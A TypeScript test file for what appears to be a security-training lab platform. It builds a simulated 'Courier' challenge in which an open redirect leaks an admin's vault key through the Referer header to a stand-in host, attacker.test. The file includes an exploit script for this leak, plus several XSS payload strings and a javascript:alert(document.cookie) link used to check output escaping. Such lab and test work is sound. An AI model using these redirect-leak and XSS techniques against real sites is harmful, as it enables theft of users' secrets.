// A victim-driven lab in miniature (SV-01 "Citadel Courier"), exercising the whole core/sim.ts pattern through
// real HTTP: the player sends the admin a link -> the admin's simulated browser follows a citadel redirect and a
// forwarding page to attacker.test -> the attacker log on the lab page shows the URL with the Referer -> the
// player reads the admin's vault key out of the Referer and opens the vault. Divine forwards with no Referer.
import { randomBytes } from 'node:crypto';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import type { Request, Response } from 'express';
import { describe, it, expect } from 'vitest';
import type request from 'supertest';
import { field, perSession } from '../src/core/lab.js';
import type { Level } from '../src/core/levels.js';
import { flagFor } from '../src/core/mount.js';
import { defineChallenge, register } from '../src/core/registry.js';
import { sendPage } from '../src/core/render.js';
import {
  ADMIN_MAILBOX, PLAYER_MAILBOX, VICTIM_LABELS, simWorld,
  type SimBrowser, type SimRequest, type SimResponse, type SimWorld,
} from '../src/core/sim.js';
import { FLAG_RE, bare, describeExploitMatrix, describeLabView, freshSession, type Agent } from './helpers.js';

const view = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'sim-courier.ejs');
const hello = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'hello.ejs');
const LAB = '/d/sim-test/courier';

// --- The fixture lab -------------------------------------------------------------------------------------------

interface Courier { readonly world: SimWorld; admin: SimBrowser; readonly key: string }

// The "level files": the landing page forwards to `next`; Acolyte leaves the browser's default Referer, Divine
// sends none.
const LANDING_POLICY: Partial<Record<Level, string>> = { divine: 'no-referrer' };

/** The courier as the admin's browser sees it at http://citadel.test: in process, never HTTP. */
function citadel(level: Level, lab: Courier, r: SimRequest): SimResponse {
  if (r.path === '/continue') { // a signed-in user is sent to their landing page, whose URL carries their vault key
    if (r.cookies.courier_session !== 'admin') return { status: 200, body: 'Sign in first.' };
    const next = r.query.get('next') ?? '/';
    return { status: 302, headers: { Location: `/landing?key=${lab.key}&next=${encodeURIComponent(next)}` } };
  }
  if (r.path === '/landing') { // "Welcome back", then on to next
    const next = r.query.get('next');
    const policy = LANDING_POLICY[level];
    return {
      status: 200, body: 'Welcome back.',
      headers: { ...(next ? { Refresh: `0; url=${next}` } : {}), ...(policy ? { 'Referrer-Policy': policy } : {}) },
    };
  }
  if (r.path === '/') return { status: 200, body: 'Courier home' };
  return { status: 404, body: 'Not found' };
}

const labs = perSession((level): Courier => {
  const world = simWorld({ mailboxes: [ADMIN_MAILBOX] });
  const lab = { world, key: randomBytes(8).toString('hex') } as Courier;
  lab.admin = world.browser((r) => citadel(level, lab, r));
  lab.admin.cookies.set('courier_session', 'admin'); // the admin is signed in
  world.inbox.deliver({
    from: 'ops@citadel.test', to: ADMIN_MAILBOX, subject: `For the admin only: ${lab.key}`, body: `Your key: ${lab.key}`,
    links: ['http://citadel.test/continue?next=/'],
  });
  world.inbox.deliver({
    from: 'ops@citadel.test', to: PLAYER_MAILBOX, subject: 'Welcome, pilgrim', body: 'Your courier home:',
    links: ['http://citadel.test/?tab=home', 'http://attacker.test/not-a-lab-link', 'javascript:alert(1)'],
  });
  return lab;
});
const labFor = (req: { sessionId: string; level: Level }): Courier => labs.for(req);

const COURIER = register(defineChallenge({
  id: 'SV-01', district: 'sim-test', slug: 'courier', dir: process.cwd(),
  title: { id: 'Kurir', en: 'Courier' }, summary: { id: 'Fixture', en: 'Fixture' },
  maps: [], levels: ['acolyte', 'divine'], hints: [],
  victim: {
    sim: (req) => labFor(req).world,
    actions: [
      {
        name: 'check-mail', label: VICTIM_LABELS.checkMail,
        run: (req) => {
          const lab = labFor(req);
          const link = lab.world.inbox.newest(ADMIN_MAILBOX)?.links[0];
          if (link === undefined) return 'The admin has no mail with a link.';
          lab.admin.follow(link);
          return 'The admin opened the newest mail and clicked its first link.';
        },
      },
      { name: 'send-link', label: VICTIM_LABELS.sendLink, input: 'url', run: (req, { url }) => { labFor(req).admin.follow(url); } },
    ],
  },
  mount: (router) => {
    const show = (res: Response, result: { ok: boolean; text: string } | null, key: string) =>
      sendPage(res, view, { account: { username: 'pilgrim', password: 'pilgrim' }, result, key });
    router.get('/', (_req, res) => show(res, null, ''));
    router.post('/', async (req: Request, res) => {
      const key = field(req, 'key');
      const ok = key !== '' && key === labFor(req).key;
      const text = !ok ? 'Wrong key.' : req.level === 'divine' ? 'Vault opened.' : `Vault opened. Flag: ${flagFor(req, COURIER)}`;
      await show(res, { ok, text }, key);
    });
  },
}));

// A lab with no victim: no panel, no victim routes.
register(defineChallenge({
  id: 'SV-02', district: 'sim-test', slug: 'plain', dir: process.cwd(),
  title: { id: 't', en: 't' }, summary: { id: 's', en: 's' }, maps: [], levels: ['acolyte', 'divine'], hints: [],
  mount: (router) => { router.get('/', (_req, res) => sendPage(res, hello, { name: 'plain' })); },
}));

// A lab whose victim misbehaves: an async action (a programming error) and an over-long note.
const misbehaving = perSession(() => simWorld());
register(defineChallenge({
  id: 'SV-03', district: 'sim-test', slug: 'misbehaving', dir: process.cwd(),
  title: { id: 't', en: 't' }, summary: { id: 's', en: 's' }, maps: [], levels: ['acolyte', 'divine'], hints: [],
  victim: {
    sim: (req) => misbehaving.for(req),
    actions: [
      { name: 'async', label: { id: 'a', en: 'a' }, run: (() => Promise.resolve('late')) as never },
      { name: 'chatty', label: { id: 'c', en: 'c' }, run: () => `${'n'.repeat(5000)}END` },
    ],
  },
  mount: (router) => { router.get('/', (_req, res) => sendPage(res, hello, { name: 'misbehaving' })); },
}));

// --- Player helpers --------------------------------------------------------------------------------------------

const sendLink = (agent: Agent, level: Level, url: unknown) =>
  agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: url as string });
const checkMail = (agent: Agent, level: Level) => agent.post(`${LAB}/victim/check-mail?level=${level}`);
const labPage = (agent: Agent, level: Level, lang = 'en') => agent.get(`${LAB}?level=${level}&lang=${lang}`);
const panelOf = (html: string): string => /<section class="sim-panel"[\s\S]*?<\/section>/.exec(html)?.[0] ?? '';
const unescapeHtml = (s: string) => s
  .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;|&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
/** What the player's server received: every Referer shown on the lab page, unescaped. */
const referers = (html: string): string[] => [...panelOf(html).matchAll(/Referer: <code>([^<]*)<\/code>/g)].map((m) => unescapeHtml(m[1]));

type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;

/** The exploit: make the admin open /continue with next= your server, read the key from the Referer, use it. */
const exploit: Script = async (agent, level) => {
  await sendLink(agent, level, 'http://citadel.test/continue?next=http://attacker.test/collect');
  const page = await labPage(agent, level);
  const ref = referers(page.text).find((r) => r.includes('key='));
  const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
  return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
};

// --- Tests -------------------------------------------------------------------------------------------------------

describeExploitMatrix<Script>({
  challenge: COURIER,
  path: LAB,
  send: (agent, level, script, _url, { sid }) => script(agent, level, sid),
  exploits: { acolyte: exploit },
  resisted: 'Wrong key.',
  legit: [
    { name: 'a wrong key', input: (a, l) => a.post(`${LAB}?level=${l}`).type('form').send({ key: 'nope' }), expect: 'Wrong key.' },
    {
      name: 'the admin opens a citadel link: nothing leaks',
      input: async (a, l) => { await sendLink(a, l, 'http://citadel.test/continue?next=/'); return labPage(a, l); },
      expect: /ended on a citadel\.test page \(HTTP 200\)/,
    },
  ],
  malformed: [],
  privileged: {
    name: 'the real vault key',
    input: (a, l, sid) => a.post(`${LAB}?level=${l}`).type('form').send({ key: labFor({ sessionId: sid, level: l }).key }),
    expect: 'Vault opened.',
  },
});

describeLabView({
  challenge: COURIER,
  path: LAB,
  account: /pilgrim[\s\S]{0,40}\/[\s\S]{0,40}pilgrim/,
  echoField: 'key',
  oddBodies: [{ key: { toString: 1 } }, { key: ['a'] }, [1, 2], {}],
  ok: (agent, level, sid) => agent.post(`${LAB}?level=${level}`).type('form').send({ key: labFor({ sessionId: sid, level }).key }),
  bad: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ key: 'nope' }),
});

describe('victim-driven lab: the full pattern over HTTP', () => {
  it('send a link -> the admin follows a citadel redirect to attacker.test -> the log shows the URL with the Referer', async () => {
    const { agent, sid } = await freshSession();
    const lab = labFor({ sessionId: sid, level: 'acolyte' });
    lab.world.now = () => Date.UTC(2026, 10, 15, 12, 0, 0);
    const sent = await sendLink(agent, 'acolyte', 'http://citadel.test/continue?next=http://attacker.test/collect');
    expect(sent.status).toBe(303);
    expect(sent.headers.location).toBe(`${LAB}?level=acolyte`);
    const page = await labPage(agent, 'acolyte');
    const panel = panelOf(page.text);
    expect(panel).toContain('Your server (attacker.test) received…');
    expect(panel).toContain('<code>GET http://attacker.test/collect</code>');
    expect(panel).toContain(`Referer: <code>http://citadel.test/landing?key=${lab.key}&amp;next=http%3A%2F%2Fattacker.test%2Fcollect</code>`);
    expect(panel).toContain('2026-11-15T12:00:00.000Z');
    expect(panel).toContain('Visit 1: 3 request(s); reached your server (attacker.test).');
    expect(lab.world.visits[0].hops.map((h) => [h.site, h.via])).toEqual([['citadel', 'start'], ['citadel', 'redirect'], ['attacker', 'refresh']]);
    const vault = await agent.post(`${LAB}?level=acolyte`).type('form').send({ key: referers(page.text).map((r) => new URL(r).searchParams.get('key'))[0] });
    expect(vault.text).toMatch(FLAG_RE);
  });

  it('divine: the same link reaches your server, but with no Referer, so no key', async () => {
    const { agent } = await freshSession();
    await sendLink(agent, 'divine', 'http://citadel.test/continue?next=http://attacker.test/collect');
    const panel = panelOf((await labPage(agent, 'divine')).text);
    expect(panel).toContain('<code>GET http://attacker.test/collect</code>');
    expect(panel).not.toContain('Referer:');
  });

  it('the panel never shows the victim\'s own requests: a secret on the admin\'s path stays hidden', async () => {
    const { agent, sid } = await freshSession();
    const lab = labFor({ sessionId: sid, level: 'acolyte' });
    const mail = await checkMail(agent, 'acolyte'); // admin -> /continue -> /landing?key=... -> /
    expect(mail.status).toBe(303);
    expect(lab.world.visits[0].hops.some((h) => h.url.includes(lab.key))).toBe(true);
    const page = await labPage(agent, 'acolyte');
    expect(page.text).not.toContain(lab.key);
    const panel = panelOf(page.text);
    expect(panel).toContain('The admin opened the newest mail and clicked its first link.');
    expect(panel).toContain('Visit 1: 3 request(s); ended on a citadel.test page (HTTP 200).');
    expect(panel).toContain('No requests yet.');
  });

  it('shows only the player\'s mailbox; citadel links open in the lab, other links are text only', async () => {
    const { agent, sid } = await freshSession();
    const page = await labPage(agent, 'acolyte');
    const panel = panelOf(page.text);
    expect(panel).toContain('Your mailbox (pilgrim@citadel.test)');
    expect(panel).toContain('Welcome, pilgrim');
    expect(labFor({ sessionId: sid, level: 'acolyte' }).world.inbox.list(ADMIN_MAILBOX)).toHaveLength(1);
    expect(page.text).not.toContain('For the admin only');
    expect(page.text).not.toContain(labFor({ sessionId: sid, level: 'acolyte' }).key);
    expect(page.text).not.toContain(ADMIN_MAILBOX);
    expect(panel).toContain(`<a href="${LAB}?tab=home&amp;level=acolyte">open in lab</a>`);
    expect(panel).toContain('<code>http://attacker.test/not-a-lab-link</code>');
    expect(panel).toContain('<code>javascript:alert(1)</code>');
    expect(panel).not.toMatch(/href="(?!\/d\/sim-test\/courier[/?])/);
  });

  it('isolates players and levels', async () => {
    const a = await freshSession();
    const b = await freshSession(a.app);
    await sendLink(a.agent, 'acolyte', 'http://attacker.test/only-a');
    expect(panelOf((await labPage(a.agent, 'acolyte')).text)).toContain('only-a');
    expect(panelOf((await labPage(b.agent, 'acolyte')).text)).not.toContain('only-a');
    expect(panelOf((await labPage(a.agent, 'divine')).text)).not.toContain('only-a');
    expect(panelOf((await labPage(a.agent, 'acolyte')).text)).toContain('only-a');
  });

  it('every action is a no-JS POST form to <lab>/victim/<name>?level=<level> on the canonical path', async () => {
    const { agent } = await freshSession();
    for (const level of ['acolyte', 'divine'] as const) {
      const panel = panelOf((await agent.get(`${LAB.toUpperCase()}?level=${level}&lang=en`)).text);
      expect(panel).toContain(`<form method="post" action="${LAB}/victim/check-mail?level=${level}" class="sim-action"`);
      expect(panel).toContain(`<form method="post" action="${LAB}/victim/send-link?level=${level}" class="sim-action"`);
      expect(panel).toMatch(/<input name="url" type="text"/);
      expect(panel).toContain('Ask the admin to check mail');
      expect(panel).toContain('Send link to the admin');
    }
    const upper = await agent.post(`${LAB.toUpperCase()}/VICTIM/SEND-LINK?level=acolyte`).type('form').send({ url: 'http://attacker.test/u' });
    expect(upper.status).toBe(303);
    expect(upper.headers.location).toBe(`${LAB}?level=acolyte`);
  });

  it('keeps the link you sent in the field, escaped', async () => {
    const { agent } = await freshSession();
    await sendLink(agent, 'acolyte', 'http://attacker.test/"><script>alert(1)</script>');
    const panel = panelOf((await labPage(agent, 'acolyte')).text);
    expect(panel).toContain('value="http://attacker.test/&#34;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
    expect(panel).not.toContain('<script>');
  });

  it('escapes everything it shows: attacker URLs, Referers, mail fields, links', async () => {
    const { agent, sid } = await freshSession();
    const lab = labFor({ sessionId: sid, level: 'acolyte' });
    lab.world.inbox.deliver({
      from: '"<script>x</script>"@citadel.test', to: PLAYER_MAILBOX, subject: '<img src=x onerror=alert(1)>',
      body: '</pre><script>alert(2)</script>', links: ['http://citadel.test/a?x="><svg onload=alert(3)>', 'http://attacker.test/\'onmouseover=\'alert(4)'],
    });
    await sendLink(agent, 'acolyte', 'http://attacker.test/\'><img src=x onerror=alert(5)>?q=\'"<>&x=1');
    await sendLink(agent, 'acolyte', 'http://citadel.test/continue?next=http://attacker.test/\'"><b>');
    const panel = panelOf((await labPage(agent, 'acolyte')).text);
    expect(panel).not.toMatch(/<script|<img|<svg|<b>|onmouseover='/);
    expect(panel).toContain('&lt;img src=x onerror=alert(1)&gt;');
    expect(panel).toContain('&lt;/pre&gt;&lt;script&gt;alert(2)&lt;/script&gt;');
    expect(panel).toContain('http://attacker.test/&#39;%3E%3Cimg'); // the URL parser percent-encodes < and >; the page escapes '
    expect(panel).toContain('&amp;x=1');
    expect(panel).toContain('Referer: <code>http://citadel.test/landing?key=');
  });

  it('a link to a non-sim host is unreachable: nothing logged, the reason told in the player\'s language', async () => {
    const { agent } = await freshSession();
    await sendLink(agent, 'acolyte', 'javascript:alert(document.cookie)');
    const en = panelOf((await labPage(agent, 'acolyte', 'en')).text);
    expect(en).toContain('Visit 1: 0 request(s); stopped: only http(s) links are followed.'); // nothing was sent
    expect(en).toContain('No requests yet.');
    const id = panelOf((await labPage(agent, 'acolyte', 'id')).text);
    expect(id).toContain('Kunjungan 1: 0 permintaan; berhenti: hanya tautan http(s) yang diikuti.');
    expect(id).toContain('Belum ada permintaan.');
    for (const [url, why] of [['http://127.0.0.1/', 'IP addresses are unreachable'], ['http://localhost:3000/', 'unknown host'], ['http://citadel.test:8080/', 'nothing listens on that citadel.test port'], ['nope', 'not a valid absolute URL']]) {
      await sendLink(agent, 'acolyte', url);
      expect(panelOf((await labPage(agent, 'acolyte')).text), url).toContain(why);
    }
  });

  it('platform strings come in both languages', async () => {
    const { agent } = await freshSession();
    const id = panelOf((await labPage(agent, 'acolyte', 'id')).text);
    for (const s of ['Korban tersimulasi', 'Kotak surat Anda (pilgrim@citadel.test)', 'Server Anda (attacker.test) menerima…', 'Minta admin memeriksa email', 'Kirim tautan ke admin', 'buka di lab', 'Belum ada permintaan.']) {
      expect(id).toContain(s);
    }
    expect(id).toContain(`(lab ini: http://citadel.test/&lt;path&gt; adalah ${LAB}/&lt;path&gt;)`);
    const en = panelOf((await labPage(agent, 'acolyte', 'en')).text);
    expect(en).toContain(`(this lab: http://citadel.test/&lt;path&gt; is ${LAB}/&lt;path&gt;)`);
    expect(en).toContain('Simulated victim');
  });

  it('odd bodies to a victim route are an unreachable visit, never a 500', async () => {
    const { agent, sid } = await freshSession();
    for (const body of [{ url: { toString: 1 } }, { url: ['http://attacker.test/'] }, [1, 2], {}]) {
      const res = await agent.post(`${LAB}/victim/send-link?level=acolyte`).send(body as object);
      expect(res.status, JSON.stringify(body)).toBe(303);
      expect(labFor({ sessionId: sid, level: 'acolyte' }).world.visits[0].hops[0]).toMatchObject({ site: 'other', reason: 'invalid' });
    }
    expect(labFor({ sessionId: sid, level: 'acolyte' }).world.attackerLog.entries()).toEqual([]);
  });

  it('only the declared actions exist; GET on an action is not one', async () => {
    const { agent } = await freshSession();
    expect((await agent.post(`${LAB}/victim/open-anything?level=acolyte`)).status).toBe(404);
    expect((await agent.get(`${LAB}/victim/send-link?level=acolyte`)).status).toBe(404);
  });

  it('a request carrying only the session cookie (curl) works the same', async () => {
    const { app, sid } = await freshSession();
    const res = await bare(app, sid).post(`${LAB}/victim/send-link?level=acolyte`).type('form').send({ url: 'http://attacker.test/curl' });
    expect(res.status).toBe(303);
    expect(panelOf((await bare(app, sid).get(`${LAB}?level=acolyte&lang=en`)).text)).toContain('http://attacker.test/curl');
  });
});

describe('victim plumbing', () => {
  it('a lab without a victim has no panel and no victim routes', async () => {
    const { agent } = await freshSession();
    const page = await agent.get('/d/sim-test/plain?level=acolyte');
    expect(page.status).toBe(200);
    expect(page.text).not.toContain('sim-panel');
    expect((await agent.post('/d/sim-test/plain/victim/send-link?level=acolyte')).status).toBe(404);
  });

  it('an async victim action is a programming error (stack-free 500); a long note is clipped', async () => {
    const { agent } = await freshSession();
    const res = await agent.post('/d/sim-test/misbehaving/victim/async?level=acolyte');
    expect(res.status).toBe(500);
    expect(res.text).not.toMatch(/at |sim\.ts|Promise/);
    expect((await agent.post('/d/sim-test/misbehaving/victim/chatty?level=acolyte')).status).toBe(303);
    const panel = panelOf((await agent.get('/d/sim-test/misbehaving?level=acolyte&lang=en')).text);
    expect(panel).toContain('n'.repeat(500));
    expect(panel).not.toContain('END');
    expect(panel).toContain('The victim&#39;s browser opened nothing.');
  });
});
